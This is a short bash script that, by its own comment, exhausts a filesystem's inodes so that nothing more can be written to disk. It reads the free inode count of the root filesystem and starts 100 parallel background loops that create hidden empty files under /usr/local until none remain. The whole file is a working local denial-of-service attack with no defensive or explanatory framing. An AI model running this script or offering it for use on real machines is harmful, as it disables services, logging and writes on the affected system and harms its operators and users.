#!/bin/bash
#Takes up all inodes - makes it impossible to write to disk

PRFX="/usr/local";
FS="/";
freeI=$(/bin/df -i "$FS"|/usr/bin/awk '{print $4}'|/usr/bin/tail -n1);

for i in `seq 1 100`;
	do for q in `seq 1 $((freeI/100))`;
		do touch "${PRFX}/.$i.$q";
	done &
done
